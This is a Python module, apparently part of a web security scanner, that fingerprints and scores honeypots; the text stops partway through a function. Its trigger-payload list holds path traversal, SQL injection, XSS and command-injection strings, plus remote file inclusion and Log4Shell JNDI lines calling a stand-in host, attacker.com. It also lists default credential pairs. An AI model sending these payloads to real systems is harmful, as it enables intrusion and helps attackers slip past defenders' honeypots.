"""Module: HONEYPOT DANCE — Honeypot detection & effectiveness scoring (v9.2.0).

Checks:
  1.  Response Timing Analysis — unnaturally precise/consistent timing.
  2.  Error Message Perfection Check — "too clean" error pages.
  3.  Known Honeypot Fingerprinting — 15+ honeypot signatures.
  4.  Behavioral Consistency Check — real servers are inconsistent; honeypots are not.
  5.  Technology Stack Anomaly Detection — claimed vs observed tech mismatch.
  6.  Default Credential Detection — common honeypot defaults.
  7.  Interaction Pattern Analysis — honeypot trigger command responses.
  8.  Honeypot Effectiveness Scoring — how convincing is the honeypot?
"""
from __future__ import annotations

import hashlib
import re
import statistics
import time
import urllib.parse
from typing import Any, Dict, List, Optional

from ..http_layer import http_probe, Finding, default_limiter


# ═══════════════════════════════════════════════════════════════════════════
# Database: Known Honeypot Signatures (15+)
# ═══════════════════════════════════════════════════════════════════════════

HONEYPOT_SIGNATURES: List[Dict[str, Any]] = [
    {
        "name": "Cowrie",
        "description": "SSH/Telnet honeypot — records brute-force attempts & credentials",
        "header_indicators": {
            "server": ["cowrie", "openssh*cowrie"],
        },
        "body_indicators": ["cowrie", "cowrie.log"],
        "path_indicators": ["/cowrie", "/honeypot/cowrie"],
        "cookie_indicators": ["cowrie"],
    },
    {
        "name": "Dionaea",
        "description": "Malware-capturing honeypot that emulates SMB, HTTP, FTP, MSSQL, MySQL",
        "header_indicators": {
            "server": ["dionaea", "dionaea honeypot"],
        },
        "body_indicators": ["dionaea", "dionaea.log", r"dionaea\.json"],
        "path_indicators": ["/dionaea"],
        "cookie_indicators": [],
    },
    {
        "name": "Kippo",
        "description": "Medium-interaction SSH honeypot — logs attacker shell interactions",
        "header_indicators": {
            "server": ["kippo", "ssh-2.0-openssh*kippo"],
        },
        "body_indicators": ["kippo", "kippo.log"],
        "path_indicators": ["/kippo"],
        "cookie_indicators": [],
    },
    {
        "name": "T-Pot",
        "description": "All-in-one honeypot platform bundling 20+ honeypots",
        "header_indicators": {
            "server": ["t-pot", "tpot", "t_pot"],
            "x-powered-by": ["t-pot"],
        },
        "body_indicators": ["t-pot", "tpotce", "t-pot honeypot", "tpot"],
        "path_indicators": ["/tpot", "/t-pot", "/hpfeeds"],
        "cookie_indicators": ["tpot"],
    },
    {
        "name": "HoneyPot",
        "description": "Classic Open-source honeypot for detecting malicious activity",
        "header_indicators": {
            "server": ["honeypot"],
        },
        "body_indicators": ["honeypot", r"honeypot\.py", "honeyd"],
        "path_indicators": ["/honeypot", "/honeyd"],
        "cookie_indicators": ["honeypot"],
    },
    {
        "name": "Glastopf",
        "description": "Web-application honeypot that emulates thousands of vulnerabilities",
        "header_indicators": {
            "server": ["glastopf", "apache/2.*glastopf"],
            "x-powered-by": ["glastopf", "php.*glastopf"],
        },
        "body_indicators": ["glastopf", "glastopf wf", "glastopf.log"],
        "path_indicators": ["/glastopf"],
        "cookie_indicators": [],
    },
    {
        "name": "Wordpot",
        "description": "WordPress-emulation honeypot — tracks exploit attempts against WP",
        "header_indicators": {
            "server": ["wordpot", "nginx.*wordpot"],
            "x-powered-by": ["wordpress", "php.*wordpress"],
            "link": ["wordpress.org"],
        },
        "body_indicators": ["wordpot", "wp-content", "wp-includes", "wordpress"],
        "path_indicators": ["/wp-login.php", "/wp-admin", "/xmlrpc.php"],
        "cookie_indicators": ["wordpress"],
    },
    {
        "name": "Amun",
        "description": "Low-interaction malware-capturing honeypot (predecessor of Dionaea)",
        "header_indicators": {
            "server": ["amun"],
        },
        "body_indicators": ["amun", "amun honeypot", "amun.log"],
        "path_indicators": ["/amun"],
        "cookie_indicators": [],
    },
    {
        "name": "Conpot",
        "description": "ICS/SCADA honeypot — emulates industrial control system protocols",
        "header_indicators": {
            "server": ["conpot", "conpot ics"],
            "x-powered-by": ["conpot"],
        },
        "body_indicators": ["conpot", "conpot ics", "modbus", "snmp"],
        "path_indicators": ["/conpot"],
        "cookie_indicators": ["conpot"],
    },
    {
        "name": "HFish",
        "description": "Cross-platform honeypot platform with web-based management",
        "header_indicators": {
            "server": ["hfish", "hfish honeypot"],
            "x-powered-by": ["hfish", "gin", "golang"],
        },
        "body_indicators": ["hfish", "hfish honeypot", "/api/v1/hfish"],
        "path_indicators": ["/hfish", "/api/hfish", "/hfish/"],
        "cookie_indicators": ["hfish"],
    },
    {
        "name": "Honeytrap",
        "description": "Network intrusion detection honeypot with extensible plugin system",
        "header_indicators": {
            "server": ["honeytrap"],
        },
        "body_indicators": ["honeytrap", "honeytrap.log"],
        "path_indicators": ["/honeytrap"],
        "cookie_indicators": [],
    },
    {
        "name": "Beeswarm",
        "description": "Honeypot framework for capturing malware distributed via HTTP",
        "header_indicators": {
            "server": ["beeswarm"],
        },
        "body_indicators": ["beeswarm", "beeswarm honeypot"],
        "path_indicators": ["/beeswarm"],
        "cookie_indicators": [],
    },
    {
        "name": "Canarytokens",
        "description": "Thinkst Canarytokens — distributed honeypot tokens for alerting",
        "header_indicators": {
            "server": ["canary", "canarytokens"],
        },
        "body_indicators": ["canarytoken", "canary token", "thinkst"],
        "path_indicators": ["/canary", "/token"],
        "cookie_indicators": [],
    },
    {
        "name": "Malcolm",
        "description": "Network traffic analysis & honeypot for artifact capture",
        "header_indicators": {
            "server": ["malcolm", "malcolm honeypot"],
        },
        "body_indicators": ["malcolm", "malcolm arkime", "arkime"],
        "path_indicators": ["/malcolm", "/arkime"],
        "cookie_indicators": [],
    },
    {
        "name": "OpenCanary",
        "description": "Low-interaction honeypot that listens on many protocols for alerts",
        "header_indicators": {
            "server": ["opencanary"],
        },
        "body_indicators": ["opencanary", "opencanary honeypot"],
        "path_indicators": ["/opencanary"],
        "cookie_indicators": [],
    },
    {
        "name": "Tanner",
        "description": "Web-based honeypot with analysis and scoring of attacks",
        "header_indicators": {
            "server": ["tanner", "tanner honeypot"],
            "x-powered-by": ["tanner"],
        },
        "body_indicators": ["tanner", "tanner honeypot", "tanner api"],
        "path_indicators": ["/tanner", "/api/tanner"],
        "cookie_indicators": ["tanner"],
    },
    {
        "name": "Honeyd",
        "description": "Virtual honeypot that simulates network stacks and services",
        "header_indicators": {
            "server": ["honeyd"],
        },
        "body_indicators": ["honeyd", "honeyd honeypot"],
        "path_indicators": ["/honeyd"],
        "cookie_indicators": [],
    },
]


# ═══════════════════════════════════════════════════════════════════════════
# Database: Trigger Payloads — requests that expose honeypot behavior
# ═══════════════════════════════════════════════════════════════════════════

TRIGGER_PAYLOADS: List[Dict[str, Any]] = [
    {
        "name": "path_traversal_root",
        "description": "Classic path traversal to /etc/passwd",
        "path": "/../../../../../../../../etc/passwd",
        "method": "GET",
        "expect_real": "diverse_error_or_partial_content",
        "honeypot_tell": "perfect_404_or_identical_error",
    },
    {
        "name": "path_traversal_double_encode",
        "description": "Double-encoded path traversal",
        "path": "/..%252f..%252f..%252fetc/passwd",
        "method": "GET",
        "expect_real": "diverse_error",
        "honeypot_tell": "perfect_404",
    },
    {
        "name": "sql_injection_classic",
        "description": "Classic SQL injection in query parameter",
        "path": "/search?q=' OR 1=1--",
        "method": "GET",
        "expect_real": "diverse_error_or_500",
        "honeypot_tell": "perfect_400_or_404",
    },
    {
        "name": "xss_reflected",
        "description": "Reflected XSS in query parameter",
        "path": "/search?q=<script>alert(1)</script>",
        "method": "GET",
        "expect_real": "diverse_response",
        "honeypot_tell": "perfect_sanitized_response",
    },
    {
        "name": "cmd_injection_semicolon",
        "description": "Command injection via semicolon",
        "path": "/ping?host=127.0.0.1;cat /etc/passwd",
        "method": "GET",
        "expect_real": "diverse_error_or_timeout",
        "honeypot_tell": "perfect_400",
    },
    {
        "name": "ssrf_localhost",
        "description": "SSRF via localhost redirect",
        "path": "/fetch?url=http://127.0.0.1",
        "method": "GET",
        "expect_real": "diverse_error_or_proxy",
        "honeypot_tell": "identical_error_page",
    },
    {
        "name": "file_inclusion_remote",
        "description": "Remote file inclusion attempt",
        "path": "/page?file=http://attacker.com/shell.php",
        "method": "GET",
        "expect_real": "diverse_error",
        "honeypot_tell": "perfect_400_or_403",
    },
    {
        "name": "ldap_injection",
        "description": "LDAP injection attempt",
        "path": "/login?user=*)(uid=*))(|(uid=*",
        "method": "POST",
        "body": b"username=*)(uid=*))(|(uid=*&password=test",
        "expect_real": "diverse_error_or_500",
        "honeypot_tell": "perfect_400",
    },
    {
        "name": "log4j_jndi",
        "description": "Log4Shell JNDI injection probe",
        "path": "/headers",
        "method": "GET",
        "headers": {"X-Forwarded-For": "${jndi:ldap://attacker.com/a}",
                     "User-Agent": "${jndi:ldap://attacker.com/a}"},
        "expect_real": "diverse_response_or_error",
        "honeypot_tell": "identical_response_to_normal",
    },
    {
        "name": "null_byte_injection",
        "description": "Null byte injection in path",
        "path": "/index.php%00.html",
        "method": "GET",
        "expect_real": "diverse_response",
        "honeypot_tell": "perfect_404",
    },
    {
        "name": "ssh_banner_probe",
        "description": "Probe for SSH-like banner via HTTP",
        "path": "/",
        "method": "OPTIONS",
        "expect_real": "allow_header_or_405",
        "honeypot_tell": "identical_to_get",
    },
    {
        "name": "exotic_http_method",
        "description": "Non-standard HTTP method TRACE",
        "path": "/",
        "method": "TRACE",
        "expect_real": "405_or_echo_body",
        "honeypot_tell": "identical_to_get_404",
    },
]


# ═══════════════════════════════════════════════════════════════════════════
# Database: Perfect Response Patterns — honeypots generate "too clean" errors
# ═══════════════════════════════════════════════════════════════════════════

PERFECT_RESPONSE_DB: Dict[str, List[Dict[str, Any]]] = {
    "error_pages": [
        {
            "pattern": r"^<(!DOCTYPE|html)\s*>",
            "name": "full_html_document_error",
            "description": "Error page is a complete HTML document — real servers often return partial/stripped errors",
            "suspicion": 0.3,
        },
        {
            "pattern": r"<head>.*</head>\s*<body>.*</body>",
            "name": "head_and_body_present",
            "description": "Error page has both <head> and <body> — extremely clean structure",
            "suspicion": 0.4,
        },
        {
            "pattern": r"<title>\d{3}\s*(Not Found|Forbidden|Bad Request|Error|Internal Server Error|Unauthorized|Moved)</title>",
            "name": "status_in_title_tag",
            "description": "HTTP status code in <title> — polished template behavior",
            "suspicion": 0.5,
        },
        {
            "pattern": r"<(h[1-6])>\s*\d{3}\s*(Not Found|Forbidden|Bad Request|Error|Internal Server Error|Unauthorized|Moved)\s*</(h[1-6])>",
            "name": "status_in_heading",
            "description": "HTTP status code in heading tag — templated honeypot error pages",
            "suspicion": 0.5,
        },
        {
            "pattern": r"(please contact|if you believe|if the problem|try again later|report this|administrator has been notified)",
            "name": "helpful_error_message",
            "description": "Overly helpful error text — real servers rarely say 'contact administrator'",
            "suspicion": 0.6,
        },
        {
            "pattern": r"nginx/[\d.]+\s*$",
            "name": "nginx_default_error",
            "description": "Stock nginx error page — often used by honeypots for simplicity",
            "suspicion": 0.3,
        },
        {
            "pattern": r"apache.*(tomcat|httpd) at \S+ port",
            "name": "apache_default_error",
            "description": "Stock Apache error page with server info — common honeypot pattern",
            "suspicion": 0.3,
        },
        {
            "pattern": r"^\s*$",
            "name": "empty_body_consistent",
            "description": "Consistently empty error bodies — may indicate template-driven responses",
            "suspicion": 0.2,
        },
    ],
    "header_perfection": [
        {
            "header": "Server",
            "suspicious_values": [
                (r"^nginx/[\d.]+$", "stock nginx version — no customization, common for honeypots", 0.4),
                (r"^Apache/[\d.]+\s*$", "bare Apache version string with no modules listed", 0.4),
                (r"^Microsoft-IIS/[\d.]+\s*$", "bare IIS version string — no custom modules", 0.3),
                (r"^OpenResty/[\d.]+\s*$", "bare OpenResty — often used in honeypot deployments", 0.3),
            ],
        },
        {
            "header": "X-Powered-By",
            "suspicious_values": [
                (r"^(Express|PHP/[\d.]+|ASP\.NET|Python/[\d.]+)\s*$", "single stock technology — no customization", 0.3),
            ],
        },
    ],
}


# ═══════════════════════════════════════════════════════════════════════════
# Database: Default Credential Pairs (common honeypot defaults)
# ═══════════════════════════════════════════════════════════════════════════

HONEYPOT_DEFAULT_CREDENTIALS: List[Dict[str, str]] = [
    {"username": "admin", "password": "admin", "source": "Cowrie/Kippo common default"},
    {"username": "admin", "password": "password", "source": "Cowrie/Kippo common default"},
    {"username": "root", "password": "root", "source": "Kippo/Cowrie default"},
    {"username": "root", "password": "toor", "source": "Cowrie/Cowrie root default"},
    {"username": "guest", "password": "guest", "source": "T-Pot default"},
    {"username": "user", "password": "user", "source": "Honeypot default"},
    {"username": "admin", "password": "123456", "source": "HFish common default"},
    {"username": "test", "password": "test", "source": "Generic honeypot default"},
    {"username": "ubuntu", "password": "ubuntu", "source": "Cowrie default"},
    {"username": "operator", "password": "operator", "source": "Conpot ICS default"},
]


# ═══════════════════════════════════════════════════════════════════════════
# Database: Technology Stack Mismatch Indicators
# ═══════════════════════════════════════════════════════════════════════════

TECH_STACK_INCONSISTENCIES: List[Dict[str, Any]] = [
    {
        "claimed_tech": "ASP.NET",
        "incompatible_with": ["nginx", "php", "ubuntu", "python"],
        "description": "Claims ASP.NET but served by nginx/PHP — possible mismatch",
    },
    {
        "claimed_tech": "PHP",
        "incompatible_with": ["express", "node", "deno", r"next\.js"],
        "description": "Claims PHP but Node.js framework detected — possible mismatch",
    },
    {
        "claimed_tech": "Express",
        "incompatible_with": ["php", r"asp\.net", "iis", "wordpress"],
        "description": "Claims Express but PHP/ASP.NET artifacts present — possible mismatch",
    },
    {
        "claimed_tech": "Python",
        "incompatible_with": ["php", r"asp\.net", "iis"],
        "description": "Claims Python but PHP/ASP.NET headers detected — possible mismatch",
    },
    {
        "claimed_tech": "Java",
        "incompatible_with": ["php", "python", "nginx-only"],
        "description": "Claims Java but PHP/Python headers detected — possible mismatch",
    },
]


# ═══════════════════════════════════════════════════════════════════════════
# Internal: Utility helpers
# ═══════════════════════════════════════════════════════════════════════════


def _body_fingerprint(body: str) -> str:
    """Generate a short hash of the response body for comparison."""
    return hashlib.sha256(body.strip().encode("utf-8", errors="replace")).hexdigest()[:16]


def _header_fingerprint(headers: Dict[str, str]) -> str:
    """Generate a short hash of normalized header keys."""
    keys = ",".join(sorted(k.lower() for k in headers.keys()))
    return hashlib.sha256(keys.encode()).hexdigest()[:16]


def _match_glob(pattern: str, value: str) -> bool:
    """Simple glob-style matching (case-insensitive). Supports * wildcards."""
    regex = "^" + re.escape(pattern).replace(r"\*", ".*") + "$"
    return bool(re.match(regex, value, re.IGNORECASE))


def _coefficient_of_variation(values: List[float]) -> Optional[float]:
    """Calculate coefficient of variation; returns None if insufficient data."""
    if len(values) < 3:
        return None
    mean = statistics.mean(values)
    if mean == 0:
        return None
    return statistics.stdev(values) / abs(mean)


def _safe_probe(
    url: str,
    method: str = "GET",
    body: Optional[bytes] = None,
    headers: Optional[Dict[str, str]] = None,
    timeout: int = 8,
    verify_tls: bool = True,
) -> Dict[str, Any]:
    """Wrapper around http_probe that also measures response time."""
    start = time.monotonic()
    result = http_probe(
        url=url,
        method=method,
        body=body,
        headers=headers,
        timeout=timeout,
        verify_tls=verify_tls,
        limiter=default_limiter,
    )
    elapsed = time.monotonic() - start
    result["elapsed"] = elapsed
    return result


def _url_join(base_url: str, path: str) -> str:
    """Safely join a base URL and a path."""
    base = base_url.rstrip("/")
    if path.startswith("/"):
        return base + path
    return base + "/" + path


def _get_all_response_text(response: Dict[str, Any]) -> str:
    """Combine headers and body for full-text analysis."""
    parts = []
    for k, v in response.get("headers", {}).items():
        parts.append(f"{k}: {v}")
    parts.append(response.get("body", ""))
    return "\n".join(parts)


# ═══════════════════════════════════════════════════════════════════════════
# Check 1: Response Timing Analysis
# ═══════════════════════════════════════════════════════════════════════════


def _analyze_response_timing(base_url: str, timeout: int, verify_tls: bool) -> Dict[str, Any]:
    """Send repeated identical requests and measure timing consistency.

    Honeypots often have deterministic, unnaturally precise timing because they
    execute minimal code. Real servers exhibit natural variance due to GC,
    thread scheduling, connection pools, etc.
    """
    findings: List[Finding] = []
    timings: List[float] = []
    statuses: List[int] = []
    body_fps: List[str] = []
    num_requests = 7

    for _ in range(num_requests):
        resp = _safe_probe(base_url, timeout=timeout, verify_tls=verify_tls)
        timings.append(resp.get("elapsed", 0))
        statuses.append(resp.get("status", 0))
        body_fps.append(_body_fingerprint(resp.get("body", "")))

    cv = _coefficient_of_variation(timings)
    identical_fps = len(set(body_fps)) == 1
    identical_statuses = len(set(statuses)) == 1

    # Check for suspiciously low variance
    is_suspicious = False
    evidence_parts: List[str] = []

    if cv is not None:
        if cv < 0.03:
            is_suspicious = True
            evidence_parts.append(
                f"Timing CV={cv:.4f} (< 0.03 threshold) across {num_requests} requests"
            )
        elif cv < 0.07:
            evidence_parts.append(
                f"Timing CV={cv:.4f} (slightly low, 0.03-0.07 range)"
            )

    if identical_fps:
        is_suspicious = True
        evidence_parts.append(
            f"All {num_requests} response bodies have identical hash ({body_fps[0]})"
        )

    if identical_statuses:
        evidence_parts.append(
            f"All {num_requests} responses returned status {statuses[0]}"
        )

    if is_suspicious:
        findings.append(Finding(
            title="Suspicious Response Timing Consistency",
            severity="medium",
            category="Honeypot Detection",
            module="honeypot_dance",
            description=(
                "Response timing is unnaturally consistent, which is a hallmark of "
                "honeypot systems that execute minimal deterministic code. Real servers "
                "exhibit natural variance from GC pauses, thread scheduling, connection "
                "pooling, and OS-level jitter."
            ),
            evidence="; ".join(evidence_parts),
            asset=base_url,
            points_deducted=15,
            remediation="If this is a legitimate server, introduce natural response jitter via "
                        "middleware delays or consider that a CDN/proxy may be normalizing latency.",
            dread_score=4.5,
        ))
    else:
        findings.append(Finding(
            title="Response Timing Appears Natural",
            severity="info",
            category="Honeypot Detection",
            module="honeypot_dance",
            description=(
                f"Response timing across {num_requests} requests shows natural variance "
                f"(CV={cv:.4f if cv else 'N/A'}), inconsistent with typical honeypot behavior."
            ),
            evidence=f"Mean={statistics.mean(timings):.4f}s, "
                    f"Stdev={statistics.stdev(timings):.4f}s, "
                    f"CV={cv:.4f if cv else 'N/A'}, "
                    f"Unique body hashes={len(set(body_fps))}/{num_requests}",
            asset=base_url,
            points_deducted=0,
            remediation="",
            dread_score=0.5,
        ))

    return {
        "findings": findings,
        "cv": cv,
        "identical_fps": identical_fps,
        "identical_statuses": identical_statuses,
        "timings": timings,
        "suspicious": is_suspicious,
    }


# ═══════════════════════════════════════════════════════════════════════════
# Check 2: Error Message Perfection
# ═══════════════════════════════════════════════════════════════════════════


def _check_error_perfection(base_url: str, timeout: int, verify_tls: bool) -> Dict[str, Any]:
    """Request invalid paths and analyze how 'perfect' the error responses are.

    Honeypots often generate beautifully formatted, template-driven error pages.
    Real servers frequently have partial, inconsistent, or raw error responses.
    """
    findings: List[Finding] = []
    error_paths = [
        "/this-path-does-not-exist-404-test",
        "/../../../etc/passwd",
        "/<script>alert(1)</script>",
        "/admin/credentials.txt",
        "/wp-admin/invalid-12345",
    ]

    error_responses: List[Dict[str, Any]] = []
    total_suspicion = 0.0
    matched_patterns: List[str] = []

    for path in error_paths:
        url = _url_join(base_url, path)
        resp = _safe_probe(url, timeout=timeout, verify_tls=verify_tls)
        body = resp.get("body", "")
        headers = resp.get("headers", {})
        status = resp.get("status", 0)

        # Check body against PERFECT_RESPONSE_DB
        for pattern_entry in PERFECT_RESPONSE_DB["error_pages"]:
            if re.search(pattern_entry["pattern"], body, re.DOTALL | re.IGNORECASE):
                total_suspicion += pattern_entry["suspicion"]
                matched_patterns.append(
                    f"[{path}] {pattern_entry['name']}: {pattern_entry['description']}"
                )

        # Check headers
        for header_entry in PERFECT_RESPONSE_DB["header_perfection"]:
            hdr_name = header_entry["header"]
            hdr_val = headers.get(hdr_name, "")
            if not hdr_val:
                continue
            for val_pattern, desc, suspicion in header_entry["suspicious_values"]:
                if re.match(val_pattern, hdr_val, re.IGNORECASE):
                    total_suspicion += suspicion
                    matched_patterns.append(
                        f"[{path}] Header {hdr_name}={hdr_val!r}: {desc}"
                    )

        error_responses.append({
            "path": path,
            "status": status,
            "body_len": len(body),
            "body_fp": _body_fingerprint(body),
        })

    # Check if all error pages have the same body fingerprint
    error_fps = [r["body_fp"] for r in error_responses if r["status"] in (400, 403, 404, 405, 500)]
    identical_errors = len(set(error_fps)) <= 1 if len(error_fps) > 1 else False

    if identical_errors and len(error_fps) > 2:
        total_suspicion += 0.5
        matched_patterns.append(
            f"All {len(error_fps)} error responses share the same body fingerprint ({error_fps[0]})"
        )

    # Also check if all error statuses are identical
    error_statuses = [r["status"] for r in error_responses]
    all_same_status = len(set(error_statuses)) == 1 and len(error_statuses) > 1
    if all_same_status:
        total_suspicion += 0.3
        matched_patterns.append(
            f"All {len(error_statuses)} error requests returned status {error_statuses[0]}"
        )

    severity = "info"
    points = 0
    dread = 0.5
    if total_suspicion >= 2.5:
        severity = "high"
        points = 25
        dread = 7.0
    elif total_suspicion >= 1.5:
        severity = "medium"
        points = 15
        dread = 5.0
    elif total_suspicion >= 0.8:
        severity = "low"
        points = 8
        dread = 3.0

    if total_suspicion > 0:
        findings.append(Finding(
            title="Overly Perfect Error Responses Detected",
            severity=severity,
            category="Honeypot Detection",
            module="honeypot_dance",
            description=(
                f"Error responses exhibit {len(matched_patterns)} indicators of template-driven "
                f"perfection. Honeypots often generate flawlessly formatted error pages, while "
                f"real servers typically produce raw, inconsistent, or partial error output. "
                f"Total suspicion score: {total_suspicion:.2f}."
            ),
            evidence="; ".join(matched_patterns[:10]),
            asset=base_url,
            points_deducted=points,
            remediation="If legitimate, ensure error pages have natural variation and avoid "
                        "overly templated structures that mimic honeypot behavior.",
            dread_score=dread,
        ))
    else:
        findings.append(Finding(
            title="Error Responses Appear Natural",
            severity="info",
            category="Honeypot Detection",
            module="honeypot_dance",
            description=(
                "Error responses do not exhibit the overly polished structure "
                "characteristic of honeypot template engines."
            ),
            evidence=f"Checked {len(error_paths)} error paths, no significant perfection patterns found",
            asset=base_url,
            points_deducted=0,
            remediation="",
            dread_score=0.5,
        ))

    return {
        "findings": findings,
        "suspicion_score": total_suspicion,
        "matched_patterns": matched_patterns,
        "identical_errors": identical_errors,
        "all_same_status": all_same_status,
    }


# ═══════════════════════════════════════════════════════════════════════════
# Check 3: Known Honeypot Fingerprinting
# ═══════════════════════════════════════════════════════════════════════════


def _check_honeypot_fingerprints(
    base_url: str, timeout: int, verify_tls: bool
) -> Dict[str, Any]:
    """Check for signatures of 15+ known honeypot platforms.

    Examines response headers, body content, cookies, and probes known honeypot paths.
    """
    findings: List[Finding] = []
    detected: List[Dict[str, Any]] = []

    # First probe: the main page
    main_resp = _safe_probe(base_url, timeout=timeout, verify_tls=verify_tls)
    main_text = _get_all_response_text(main_resp)
    main_headers = main_resp.get("headers", {})
    main_cookies = main_headers.get("set-cookie", "")

    # Probe honeypot-specific paths
    probe_paths: List[str] = []
    for sig in HONEYPOT_SIGNATURES:
        probe_paths.extend(sig.get("path_indicators", []))
    probe_paths = list(set(probe_paths))

    probe_results: Dict[str, Dict[str, Any]] = {}
    for path in probe_paths:
        url = _url_join(base_url, path)
        resp = _safe_probe(url, timeout=timeout, verify_tls=verify_tls)
        probe_results[path] = resp

    for sig in HONEYPOT_SIGNATURES:
        sig_name = sig["name"]
        sig_indicators: List[str] = []
        sig_confidence = 0.0

        # Check header indicators
        for hdr_name, patterns in sig.get("header_indicators", {}).items():
            hdr_val = main_headers.get(hdr_name, "")
            if not hdr_val:
                continue
            for pat in patterns:
                if _match_glob(pat, hdr_val):
                    sig_indicators.append(
                        f"Header {hdr_name} matches '{pat}' (value: {hdr_val!r})"
                    )
                    sig_confidence += 0.35

        # Check body indicators
        for body_pat in sig.get("body_indicators", []):
            if re.search(body_pat, main_text, re.IGNORECASE):
                sig_indicators.append(f"Body contains pattern '{body_pat}'")
                sig_confidence += 0.3

        # Check cookie indicators
        for cookie_pat in sig.get("cookie_indicators", []):
            if re.search(cookie_pat, main_cookies, re.IGNORECASE):
                sig_indicators.append(f"Cookie matches pattern '{cookie_pat}'")
                sig_confidence += 0.2

        # Check path indicator probes
        for path in sig.get("path_indicators", []):
            if path in probe_results:
                p_resp = probe_results[path]
                p_text = _get_all_response_text(p_resp)
                p_status = p_resp.get("status", 0)
                if p_status == 200:
                    sig_indicators.append(
                        f"Path '{path}' returned 200 OK (expected 404 on real server)"
                    )
                    sig_confidence += 0.4
                for body_pat in sig.get("body_indicators", []):
                    if re.search(body_pat, p_text, re.IGNORECASE):
                        sig_confidence += 0.15

        if sig_confidence >= 0.3:
            # Cap confidence at 1.0
            sig_confidence = min(sig_confidence, 1.0)
            detected.append({
                "name": sig_name,
                "description": sig["description"],
                "confidence": sig_confidence,
                "indicators": sig_indicators,
            })

            severity = "critical" if sig_confidence >= 0.8 else (
                "high" if sig_confidence >= 0.6 else (
                    "medium" if sig_confidence >= 0.4 else "low"
                )
            )

            findings.append(Finding(
                title=f"Honeypot Signature Matched: {sig_name}",
                severity=severity,
                category="Honeypot Detection",
                module="honeypot_dance",
                description=(
                    f"Target matches the fingerprint of '{sig_name}' — {sig['description']}. "
                    f"Confidence: {sig_confidence:.0%}. "
                    f"Indicators: {len(sig_indicators)}."
                ),
                evidence="; ".join(sig_indicators[:8]),
                asset=base_url,
                points_deducted=int(sig_confidence * 30),
                remediation=(
                    f"If this is a legitimate deployment of {sig_name}, ensure it is properly "
                    f"segmented and not exposed to external reconnaissance. Remove identifying "
                    f"headers and paths if the honeypot is intended to be covert."
                ),
                dread_score=sig_confidence * 9.0,
            ))

    if not detected:
        findings.append(Finding(
            title="No Known Honeypot Signatures Detected",
            severity="info",
            category="Honeypot Detection",
            module="honeypot_dance",
            description=(
                f"Checked {len(HONEYPOT_SIGNATURES)} known honeypot fingerprints including "
                f"Cowrie, Dionaea, Kippo, T-Pot, Glastopf, Wordpot, Conpot, HFish, and more. "
                f"No signatures matched."
            ),
            evidence=f"Scanned against {len(HONEYPOT_SIGNATURES)} honeypot signatures, "
                    f"probed {len(probe_paths)} honeypot-specific paths",
            asset=base_url,
            points_deducted=0,
            remediation="",
            dread_score=0.5,
        ))

    return {
        "findings": findings,
        "detected": detected,
        "probed_paths": len(probe_paths),
    }


# ═══════════════════════════════════════════════════════════════════════════
# Check 4: Behavioral Consistency
# ═══════════════════════════════════════════════════════════════════════════


def _check_behavioral_consistency(
    base_url: str, timeout: int, verify_tls: bool
) -> Dict[str, Any]:
    """Send unusual/varied requests and measure how consistent responses are.

    Real servers are inconsistent: they may return 404 for some invalid paths,
    403 for others, 500 for malformed input, etc. Honeypots tend to return
    identical, perfectly formatted responses regardless of input.
    """
    findings: List[Finding] = []

    # Unusual requests that a real server would handle differently
    unusual_requests = [
        ("GET", "/", {}, None),
        ("GET", "/favicon.ico", {}, None),
        ("GET", "/robots.txt", {}, None),
        ("GET", "/sitemap.xml", {}, None),
        ("GET", "/.well-known/security.txt", {}, None),
        ("GET", "/nonexistent-random-abc123", {}, None),
        ("GET", "/nonexistent-random-xyz789", {}, None),
        ("POST", "/", {}, b"{}"),
        ("POST", "/nonexistent", {}, b'{"key": "value"}'),
        ("PUT", "/nonexistent", {}, b"test"),
        ("DELETE", "/nonexistent", {}, None),
        ("GET", "/api/v1/endpoint", {}, None),
        ("GET", "/admin", {}, None),
        ("GET", "/login", {}, None),
        ("HEAD", "/", {}, None),
    ]

    results: List[Dict[str, Any]] = []
    for method, path, extra_headers, body in unusual_requests:
        url = _url_join(base_url, path)
        resp = _safe_probe(
            url, method=method, body=body,
            headers=extra_headers if extra_headers else None,
            timeout=timeout, verify_tls=verify_tls,
        )
        results.append({
            "method": method,
            "path": path,
            "status": resp.get("status", 0),
            "body_fp": _body_fingerprint(resp.get("body", "")),
            "header_fp": _header_fingerprint(resp.get("headers", {})),
            "body_len": len(resp.get("body", "")),
        })

    statuses = [r["status"] for r in results]
    body_fps = [r["body_fp"] for r in results]
    header_fps = [r["header_fp"] for r in results]
    body_lens = [r["body_len"] for r in results]

    unique_statuses = len(set(statuses))
    unique_bodies = len(set(body_fps))
    unique_headers = len(set(header_fps))

    # Real servers have diverse responses
    inconsistency_score = 0.0
    evidence_parts: List[str] = []

    if unique_statuses <= 2 and len(statuses) > 5:
        inconsistency_score += 0.4
        evidence_parts.append(
            f"Only {unique_statuses} unique status codes across {len(statuses)} requests"
        )

    if unique_bodies <= 3 and len(body_fps) > 5:
        inconsistency_score += 0.3
        evidence_parts.append(
            f"Only {unique_bodies} unique body fingerprints across {len(body_fps)} requests"
        )

    if unique_headers == 1 and len(header_fps) > 3:
        inconsistency_score += 0.3
        evidence_parts.append(
            f"All {len(header_fps)} responses have identical header structure"
        )

    # Check body length variance
    if len(body_lens) >= 3:
        body_cv = _coefficient_of_variation([float(l) for l in body_lens if l > 0])
        if body_cv is not None and body_cv < 0.05:
            inconsistency_score += 0.3
            evidence_parts.append(
                f"Body length CV={body_cv:.4f} (near-zero variance in response sizes)"
            )

    is_honeypot_like = inconsistency_score >= 0.6

    if is_honeypot_like:
        findings.append(Finding(
            title="Highly Consistent Behavior Detected (Honeypot-Like)",
            severity="medium",
            category="Honeypot Detection",
            module="honeypot_dance",
            description=(
                f"Across {len(results)} varied requests (different methods, paths, content types), "
                f"the server responded with suspiciously uniform behavior. Real servers "
                f"exhibit natural inconsistency: different status codes for different errors, "
                f"varying body content, and evolving headers. Honeypots typically use a "
                f"single response template. Consistency score: {inconsistency_score:.2f}"
            ),
            evidence="; ".join(evidence_parts),
            asset=base_url,
            points_deducted=15,
            remediation="If this is a legitimate server, ensure different error paths return "
                        "appropriately varied responses (e.g., 404 for missing pages, 405 for "
                        "wrong methods, 415 for wrong content types).",
            dread_score=5.0,
        ))
    else:
        findings.append(Finding(
            title="Behavioral Inconsistency is Natural",
            severity="info",
            category="Honeypot Detection",
            module="honeypot_dance",
            description=(
                f"The server shows {unique_statuses} unique status codes, {unique_bodies} unique "
                f"body fingerprints, and {unique_headers} unique header structures across "
                f"{len(results)} requests. This natural variance is inconsistent with honeypot behavior."
            ),
